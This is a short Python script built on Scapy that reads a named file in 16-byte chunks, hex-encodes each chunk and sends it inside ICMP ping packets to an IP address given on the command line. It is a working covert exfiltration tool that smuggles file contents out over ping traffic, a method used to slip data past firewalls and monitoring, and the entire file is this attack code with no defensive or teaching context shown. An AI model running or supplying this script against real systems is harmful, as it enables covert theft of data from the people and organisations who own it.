#!/bin/python
from scapy.all import *
import sys

MESSAGE_SIZE = 16

if(len(sys.argv) != 3):
    print("Usage: {} file_name ipDst".format(sys.argv[0]))
    exit(1)
file = open(sys.argv[1],'rb')
buff = file.read(MESSAGE_SIZE)
while len(buff) == MESSAGE_SIZE:
    pingr = IP(dst=sys.argv[2])/ICMP()/buff.hex().encode()
    sr1(pingr)
    buff = file.read(MESSAGE_SIZE)
sr1(IP(dst=sys.argv[2])/ICMP()/buff.hex().encode())
